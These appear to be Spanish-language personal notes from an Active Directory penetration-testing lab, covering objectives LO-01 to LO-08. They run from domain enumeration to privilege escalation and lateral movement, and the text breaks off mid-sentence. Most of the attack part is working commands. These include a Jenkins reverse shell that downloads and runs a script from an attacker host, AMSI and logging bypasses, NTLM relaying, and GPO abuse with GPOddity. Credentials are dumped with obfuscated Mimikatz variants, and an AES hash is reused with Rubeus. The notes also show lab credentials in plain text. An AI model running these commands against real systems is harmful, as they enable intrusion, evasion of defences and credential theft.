# Enumeración

*LO - 01*
## Usuarios del dominio
Enumerar todos los usuarios del dominio quedándonos solo con el nombre de usuario
```shell
Get-DomainUser -Domain dollarcorp.moneycorp.local | select samacountname
```

## Equipos del dominio
Enumerar todos los equipos que se encuentran en el dominio
```shell
Get-DomainComputer -Domain dollarcorp.moneycorp.local | Select-Object -ExpandProperty dnshostname
```

## Administradores del dominio
Enumeraremos los usuarios pertenecientes al grupo Domain Admins
```shell
Get-DomainGroupMember -Domain dollarcorp.moneycorp.local -Identity "Domain Admins" -Recurse
```

## Enterprise Admins del dominio
Enumerar los usuarios pertenecientes al grupo Enterprise Admins del dominio
 ```shell
 Get-DomainGroupMember -Identity "Enterprise Admins" -Domain dollarcorp.moneycorp.local -Recurse
 ```

Al no mostrarnos nada enumeraremos las confianzas viendo que pertenecemos al bosque de *moneycorp.local*
```shell
Get-DomainTrust
```

Una vez descubierto el bosque adaptaremos el comando para buscar en el dominio
```shell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local -Recurse
```

## Enumerar carpetas compartidas
Enumeraremos carpetas compartidas donde los nuestro usuario tenga permisos de de escritura
- Primero deberemos enumerar los equipos de la red y guardarlo en un archivo *.txt*
```shell
Get-DomainComputer | select -ExpandProperty dnshostname | Out-File -FilePath "C:\AD\Tools\servers.txt"
```

- Ahora usaremos la herramienta *PowerHuntShares* importando el modulo de *PowerHuntShares.psm1* y ejecutar *HuntSMBShares*
- Cargamos el modulo
```shell
Import-Module C:\AD\Tools\PowerHuntShares.psm1
```

- Y lo ejecutamos
```shell
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList C:\AD\Tools\servers.txt
```

- Obteniendo información sobre los recursos compartidos a los que tenemos acceso
- Ahora podremos pasárnoslo a la maquina local y podremos enumerar con la interfaz grafica de *ShareGraph*
- Pudiendo ver ahora que el recurso compartido llamado *IA* tiene permisos de escritura para todos.

*LO - 02*
## Enumerar las ACL para el grupo de Domain Admins
Enumeraremos las ACL del grupo de Domain Admin, en caso de tener una shell iniciada con comandos recientes si da error hay que abrirse una nueva
```shell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

## Enumerar las ACL donde tenemos permisos interesante
Enumeraremos las ACL de nuestro usuario para saber si hay alguna interesante aplicada sobre el para poder intentar aprovecharnos de ella en un fututo
```shell
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student97"}
```

En caso de no ver nada sobre nuestro usuario podemos revisar a que grupos pertenecemos y hacer la enumeración de las ACL de estos
```shell
whomai /groups
```

En cado de encontrar algún grupo interesante como puede ser el de RDPUsers volvemos a lanzar la enumeración
```shell
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

*LO - 03*
## Enumerar las OU del dominio dollarcor.moneycorp.local
Enumeraremos todas las Unidades Organizativas del dominio actual
```shell
Get-DomainOU -Domain dollarcorp.moneycorp.local | select name, ou, distinguishedname
```

Una ves enumeradas todas las Unidades Organizativas lo siguiente que podemos hacer es enumerar todos los equipos que pertenecen a una unidad organizativa
```shell
(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```

## Enumerar las GPO
Enumeraremos las GPO implementadas
```shell
Get-DomainGPO | select displayname
```

También podemos enumerar las GPO que están aplicadas sobre una Unidad Organizativa como puede ser DevOps
Para ello lo primero que necesitaremos sera el nombre de la directiva del atributo gplink de la Unidad Organizativa
```shell
(Get-DomainOU -Identity DevOps).gplink
```

Deberemos de copiar el valor que se encuentra entre corchetes incluyendo estos, a continuación ya podremos enumerar las GPO de la Unidad Organizativa
```shell
Get-DoaminGPO -Idenetity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```

*LO - 04*

## Enumerar todos los dominios en bosque *moneycorp.local*
Enumeraremos todos los dominios que se encuentran en el bosque
```shell
Get-DomainTrust -Domain dollarcorp.moneycorp.local | select TargetName,TrustAttributes,TrustDirection
```

## Enumerar las confianzas del dominio actual
Enumeraremos las confianzas de nuestro dominio pudiendo recoger las confianzas y la dirección relativa de estos
```shell
Get-DomainTrust -Domain dollarcorp.moneycorp.local
```

## Enumerar las confianzas externas al bosque *moneycorp.local*
Enumeraremos todas la confianzas externas del bosque filtrando únicamente por el SID principal
```shell
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

## Enumerar las relaciones de confianzas externas al dominio *dollarcorp.moneycorp.local*
Habiendo enumerado ya las confianzas del bosque y  y del dominio hemos descubierto que hay un bosque externo vamos a enumerarlo verificar las relaciones de confianza
```shell
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```

Dándonos cuenta que no podemos enumerar un bosque o dominio externo al nuestro si intentamos obtener mas información del dominio usando
```shell
Get-DomainForest -Forest eurocorp.local
```

Nos daremos cuenta que no lo podemos enumerar completo ya que no tenemos visibilidad con el

*LO - 05*

# Explotación
## Explotar un servicio en la maquina de estudiante y elevar los privilegios a Administrador Local

Deberemos de tener iniciada una *InviShell* y ejecutar *PowerUp.ps1*
```shell
. C:\AD\Tools\PowerUp.ps1
```

Usaremos un atributo de PowerUp el cual nos permite enumerar todos los servicios vulnerables con las opciones vulnerables habilitadas como *CanRestarr: True*, *Check: Modifiable Services* y *Unquoted service Paths*
```shell
Invoke-AllChecks
```

Hay varios servicios vulnerables, en este caso elegiremos un servicio que disponga de CanRestarr: True como es el servicio de SNMPTRAP
Para abusar de el tendremos que revisar diferentes opciones para abusar de el
```shell
help Invoke-ServiceAbuse -Example
```

Buscaremos cual es la función que nosotros requerimos, en este caso queremos añadir a nuestro usuario al grupo de Administradores Locales
```shell
Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName "scorp\student97" -verbose
```

Verificaremos si pertenecemos al grupo de Adminitradores
```shell
Get-LocalGroupMember -Group "Administrators"
```

Una vez tenemos la cuenta como usuario Administrador local podemos enumerar otras maquinas en el dominio en el que tengamos acceso como administrador local
Primero tendremos que cargar la herramienta Find-PSRemotingLocalAdminAccess.ps1
```shell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

A continuación podremos ejecutarlo viendo en que cuentas tenemos permisos de Administrador Local
```shell
Find-PSRemotingLocalAdminAccess -Verbose
```

Descubriendo permisos de administrador local en otras maquinas en este caso descubrimos permisos de Administrador en Adminsrv, por lo cual nos conectaremos a ella 
```shell
winrs -r:dcorp-adminsrv cmd
```

O también podemos usar
```shell
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

## Explotación de Jenkins 172.16.3.11:8080
```ad-todo
Antes de empezar con la explotacion deberemos identificar el servicio del que hablamos en este caso un Jenkins.
Primero deberemos extraer una lista de equipos que haya en el dominio, exportarla y a continuacion hacer una enumeracion de red sobre estos activos
```shell
$Ports = @(80,443,8080,8443,3389,445,135,5985,5986,22,1433,3306,5432)

Get-DomainComputer | Select-Object -ExpandProperty DNSHostName | ForEach-Object {

    $HostName = $_

    try {

        $IP = (Resolve-DnsName $HostName -Type A -ErrorAction Stop |
               Select-Object -First 1 -ExpandProperty IPAddress)

        $OpenPorts = foreach($Port in $Ports) {

            try {

                $TcpClient = New-Object System.Net.Sockets.TcpClient
                $Connect = $TcpClient.BeginConnect($HostName,$Port,$null,$null)

                if($Connect.AsyncWaitHandle.WaitOne(500,$false))
                {
                    $TcpClient.EndConnect($Connect)
                    $TcpClient.Close()
                    $Port
                }
                else
                {
                    $TcpClient.Close()
                }

            } catch {}
        }

        if($OpenPorts)
        {
            [PSCustomObject]@{
                DNSHostName = $HostName
                IP          = $IP
                OpenPorts   = ($OpenPorts -join ",")
            }
        }

    } catch {}
} | Format-Table -AutoSize
```

Accederemos a la web y hay un campo el cual nos muestra diferentes nombres de usuario pertenecientes a la web, antes de hacer un ataque de fuerza bruta probaremos haciendo un User as Password por si hay alguna coincidencia, en este caso *builduser::builduser*

Una vez estamos dentro podemos modificar un proyecto y enviarnos una reverse shell.
Entraremos en un proyecto, y en la parte de configuración -> Build steps podemos meter nuestra reverse shell
```shell
powershell.exe iex (iwr http://172.16.100.97/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.97 -Port 1339
```

La guardaremos y nos pondremos en escucha por el puerto indicado en esta
```shell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
```

Además al tener Privilegios de Administrador Local podremos deshabilitar las reglas de firewall
Después de tenerlo deshabilitado podemos ejecutar el servidor web HFS.exe, al cual le cargaremos los siguientes archivos: *Invoke-PowerShellTCP.ps1*, *Amsi-Byp.txt*, *Loades.exe*, *PowerView.ps1*, *SafetyKatz.exe* y *sbloggingbypass.txt*

Ahora en el Jenkins le damos a Build Now y recibiremos una shell en nuestra maquina
Pudiendo interactuar ahora con la maquina que alberga el Jenkins, en este caso dcorp/ciadmin

*LO - 06*
# Escalada de privilegios
Ahora lo que haremos será escalar privilegios en la maquina de *dcorp-ci*, primero veremos las GPO que tiene implementadas
```shell
Get-DomainGPO -ComputerIdentity DCORP-CI
```

Obteniendo información como que pertenece a la política de *DevOps*, para confirmar que es asi ejecutaremos el siguiente comando
```shell
Get-DomainGPO -Identity 'DevOps Policy'
```

En el primer laboratorio tras la enumeración descubrimos un recurso compartido en dcorp-ci llamado AI, nos aprovecharemos de este.
Accedemos al archivo compartido a través de la ruta `\\dcorp-ci\AI`, aquí encontramos un archivo con logs.
Leyendo el archivo comprendemos que esta ruta se usa para una automatización la cual ejecuta automáticamente accesos directos (Archivos .lnk) como usuario devopsadmin, este usuario se encuentra en la enumeración hecha con BloodHound que tiene activo WriteDACL sobre la política DevOps.
Vamos a aprovecharnos de esto usando *GPOddity*
En primer lugar tendremos que usar *ntlmrelayx* que la ejecutaremos en la maquina WSL Ubuntu para obtener las credenciales del usuario devopsadmin
```shell
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.97 --http-port '8081' -i --no-smb-server
```

Una vez ejecutado en nuestra maquina virtual deberemos de crear en la ruta de AD\Tools un acceso directo con el siguiente payload
```shell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.97:8081' -UseDefaultCredentials"
```

Y lo copiaremos al recurso compartido dcoro-ci\AI
```shell
xcopy C:\AD\Tools\student97.lnk \\dcorp-ci\AI
```

La automatización ejecutara el archivo y se creara una conexión en caso de no hacerse solo le podemos hacer doble click nosotros, nos mostrara un mensaje de que se ha automatizado una conexión en el 127.0.0.1:11000 nos abriremos una nueva WSL y nos conectaremos
```shell
nc 127.0.0.1 11000
```

Sobre este usuario intentamos darle permisos sobre la Política de DevOps con distinguishedname  {0BF8D01C-1F62-4BDC-958C-57140B67D147} usando
```shell
write_gpo_dacl student97 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

En caso de no poder hacerlo por que el usuario no conste en la maquina podemos crear un usuario nuevo
```shell
add_computer std97-gpattack Secretpass@123
```

Y ahora ya poder aprovecharnos de la politica
```shell
write_gpo_dacl std97-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

Una ves tengamos la respuesta necesaria con nuestro Have Fun, deberemos de detener el interprete de comandos LDAP y el ntlmrelayx y así poder ejecutar GPOddity
```shell
cd /mnt/c/AD/Tools/GPOddity
```

Y ejecutar GPOddity
```shell
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student97' --password 'vy8HMb2BmT6xGGaM' --command 'net localgroup administrators student97 /add' --rogue-smbserver-ip '172.16.100.97' --rogue-smbserver-share 'std97-gp' --dc-ip '172.16.2.1' --smb-mode none
```

Ahora deberemos de mantenerlo corriendo y en una WSL Ubuntu nueva deberemos de comaprtir el directorio std97-pg
```shell
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std97-gp
```

Deberemos abrir una nueva consola de Windows como Administrador para crear un recurso compartido std97-gp y asignarle privilegios para todos
```shell
net share std687-gp=C:\AD\Tools\std97-gp /grant:Everyone,Full
```
```shell
icacls "C:\AD\Tools\std97-gp" /grant Everyone:F /T
```

Ahora podemos verificar si se ha modificado la ruta de *gPCfileSysPath* de la política de DevOps
```shell
Get-DomainGPO -Identity "DevOps Policy"
```

Esperaremos y se nos tendría que asignar a nuestro usuario al grupo de Administradores locales en dcorp-ci
Comprobaremos si se ha hecho efectivo ejecutando
```shell
winrs -r:dcorp-ci cmd /c "set computername && set username"
```

En caso de que nos responda es que se esta ejecutando, para obtener una shell interactiva usaremos
```shell
winrs -r:dcorp-ci cmd
```

*LO -07*

# Enumeración
## Enumerar una maquina en el dominio destino que tenga una sesión de administrador de dominio disponible
Tendremos que verificar si hay alguna sesión de Administrador de Dominio disponible
```shell
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

A continuación buscaremos con usuarios que tengas estos privilegios de Domain Admin
```shell
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```

O en caso de querer indicar un objetivo especifico
```shell
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
```


# Escalada de privilegios
En la maquina de dcorp-ci una vez hemos obtenido la reverse shell como en el laboratorio 05, deberemos de cargar las siguientes herramientas en el orden indicado

Primero deberemos de cargar dos ficheros que nos ayudaran al bypass de la AMSI
```shell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sbloggingbypass.txt')
```
```shell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-Byp.txt')
```

Segundo ya una vez que hayamos ejecutado el bypass podremos cargar un PowerView
```shell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
```

Una vez cargado podemos usar herramientas de este en este caso enumeraremos los usuarios conectados a los equipos de dominio
```shell
Find-DomainUserLocation
```

Encontrando una sesión de administrador de dominio en dcorp-mgnt podemos aprovecharnos de esto usando winrs
```shell
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

Pudiendo enumerar el nombre del equipo y del usuario la idea ahora seria extraer las credenciales del usuario, usando SafetyKatz.
Primero tendremos que enviarle Loader.exe a la maquina de dcorp-ci, es una herramienta la cual nos ayudara a poder ejecutar SafetyKatz en memoria, después de ahí la deberemos de copiar a dcorp-mgnt y poder ejecutar SafetyKatz

Nos la copiamos a la maquina dcorp-ci
```shell
iwr http://172.16.100.97/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Y nos la copiamos a dcorp-mgnt
```shell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Ahora haremos un renvió de puertos en dcorp-mgnt para evitar la detección en este
```shell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97"
```

Ahora para ejecutar SafetyKatz y poder ejecutarlo en la memoria 
```shell
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

Obteniendo las credenciales de svcadmin, ahora con Rubeus en una nueva terminal como administrador  le pasaremos el hash aes256 y se nos permitirá conectarnos vía winrs
```shell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Pudiendo ahora acceder a svcadmin con winrs
```shell
winrs -r:dcorp-dc cmd
```

## Escalada de privilegios abusando de la administración local derivada a través de dcorp-adminsrv
Lo primero que deberemos de hacer es saber en que maquinas tenemos privilegios de administrador local
```shell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```
```shell
Find-PSRemotingLocalAdminAccess
```

Vemos que tenemos tenemos privilegios de administrador local en adminsrv
A continuación vamos a enumerar los servicios corriendo en esta maquina
```shell
sc query
```

En caso de querer buscar un servicio en concreto como este caso *AppLocker*, utiliza un servicio del que depende llamado *AppIDSvc*
```shell
sc query AppIDSvc
```

Una vez confirmemos que este servicio existe, buscaremos si existe la configuración de *AppLocker*
```shell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

La respuesta nos desvela que este esta configurado, además de mostrarnos las políticas definidas para múltiples tipos de ejecución
Para saber si hay alguna regla/política demasiado permisiva haremos la siguiente enumeración en cada resultado obtenido en la salida anterior
```shell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\<ruta>
```

A continuación enumeraremos estas enumerando uno por uno los *GUID*
```shell
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\<ruta>\<GUID>
```

Una ves la enumeremos tenemos que prestar atención a parámetros que pueden hacer que estas sean demasiado permisivas, los parámetros son:
- *UserOrGroupSid = S-1-1-0* -> Aplica a todo el mundo
- *AuthenticatedUsers* -> Aplica a todo el mundo
- *Action="Allow"* -> Regla que permite, suelen ser las mas vulnerables
- *FilePathCondition Path="..."* -> Dependen de rutas, son las mas débiles, si el *path* incluye *`*`* es mas vulnerable aun o si tiene variables peligrosas como *%WINDIR%\** o *%TEMP%\** 
- *FilePublisherCondition* -> Permiten por firma digital siendo muy peligroso si son muy genéricos *`*`* o muy amplio *MICROSOFT CORPORATION* pudiendo abusar de *LOLBins*

Encontramos una regla muy permisiva en
```shell
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

Ya que es una regla predeterminada que permite a todos ejecutar scripts desde *C:\ProgramFiles*
También podemos enumerar estas detrás de una forma mas clara usando una conexión remota desde nuestro propio equipo, realizaremos la conexión remota usando el siguiente comando que nos otorgara una *PowerShell*
```shell
Enter-PSSession dcorp-adminsrv
```

Podemos enumerar el tipo de lenguaje que usa
```shell
 $ExecutionContext.SessionState.LanguageMode
```
Te muestra el tipo de lenguaje de PowerShell implementado siendo *FullLanguage* -> sin restricciones, *ConstrainedLanguage* -> muy limitado y *NoLanguage* -> casi bloqueado
En esta caso es *ConstrainedLanguage*

Y una vez en la conexión Obtendremos las políticas de *AppLocker* de la maquina
```shell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Volviendo a ver que cualquier persona puede ejecutar scripts desde *C:\ProgramFiles*
No se nos permite ejecutar scripts usando el origen de puntos *. .\Invoke-Mimi.ps1*, por lo que tendremos que modificar el script e incluir una propia llamada a la función en el propio script

Vamos a crear el nuevo *Invoke-TheKat* le llamaremos de la siguiente forma: *Invoke-TheKatEx-keys-std97.ps1*
Primero tendremos que crear una copia del  *Invoke-TheKat* original y cambiarle el nombre a *Invoke-TheKatEx-keys-std97.ps1*
Una vez le hayamos cambiado el nombre le damos clic derecho y editar, tendremos que sustituir el contenido de las ultimas líneas por:
```shell
$jq = "t";
$hk = "o";
$cr = "k";
$dg = "e";
$z3 = "n";
$y4 = ":";
$fq = ":";
$67 = "e";
$qj = "v";
$27 = "a";
$yt = "s";
$ws = "i";
$h4 = "v";
$li = "e";
$tv = "-";
$2h = "e";
$qx = "l";
$lx = "e";
$l1 = "v";
$68 = "a";
$5d = "t";
$ny = "e";
$25 = " ";
$d9 = "s";
$9z = "e";
$8x = "k";
$r2 = "u";
$6x = "r";
$zq = "l";
$06 = "s";
$td = "a";
$hb = ":";
$gz = ":";
$nx = "e";
$0n = "v";
$qz = "a";
$ct = "s";
$mj = "i";
$ue = "v";
$sf = "e";
$2c = "-";
$9u = "e";
$hp = "k";
$x0 = "e";
$yb = "y";
$r1 = "s";
$Pwn = $jq + $hk + $cr + $dg + $z3 + $y4 + $fq + $67 + $qj + $27 + $yt + $ws + $h4 + $li + $tv + $2h + $qx + $lx + $l1 + $68 + $5d + $ny + $25 + $d9 + $9z + $8x + $r2 + $6x + $zq + $06 + $td + $hb + $gz + $nx + $0n + $qz + $ct + $mj + $ue + $sf + $2c + $9u + $hp + $x0 + $yb + $r1 ;

Invoke-TheKat -Command $Pwn
```

Ahora una vez el archivo modificado lo transferiremos a la maquina victima, desde una terminal como administrador
```shell
Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Navegaremos a la ruta donde lo hemos copiado y lo ejecutaremos
```shell
.\Invoke-TheKatEx-keys-std97.ps1
```

A la hora de haberlo ejecutado encontraremos las credenciales de los usuarios dcorp-adminsrv$, appadmin y websvc

También se pueden buscar credenciales en el almacén de credenciales de *Windows*
Vamos a crear el nuevo *Invoke-TheKat* le llamaremos de la siguiente forma: *Invoke-TheKatEx-vault-std97.ps1*
Primero tendremos que crear una copia del  *Invoke-TheKat* original y cambiarle el nombre a *Invoke-TheKatEx-vault-std97.ps1*
Tendremos que modificar el archivo y añadir en la ultima linea
```shell
Invoke-TheKat -Command '"token::evasive-elevate" "vault::cred /patch"'
```

Lo volvemos a copiar en la maquina victima y lo ejecutamos
```shell
Copy-Item C:\AD\Tools\Invoke-TheKatEX-vault-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Obteniendo la credencial del usuario srvadmin en texto plano
Ahora podemos ejecutar un proceso como srvadmin y obtener una shell como Administrador siendo el usuario studen97

```shell
runas /user:dcorp\srvadmin /netonly cmd
```

*TheKeyUs3ron@anyMachine!*


Una vez dentro ejecutaremos una invishell
```shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

Y buscaremos si el usuario srvadmin tiene privilegios de administrador en otras maquinas
```shell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```
```shell
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
```

Descubriendo que los tiene en adminsrv y mgmt
Teniendo acceso de administrador local en esa maquina de dcorp-mgmt y sabemos que hay una sesión activa en esa maquina como es svcadmin usaremos SafetyKatz para extraer las credenciales de la maquina, copiando el Loader a dcorp-mgmt
```shell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Extraeremos las credenciales
```shell
winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
```


Haremos el renvió de puertos
```shell
winrs -r:dcorp-adminsrv cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
```

Y ejecutaremos el SafetKatz
```shell
winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
```


*LO -08*
## Extraer los secrets de un Domain Controller
Ejecutaremos una shell como 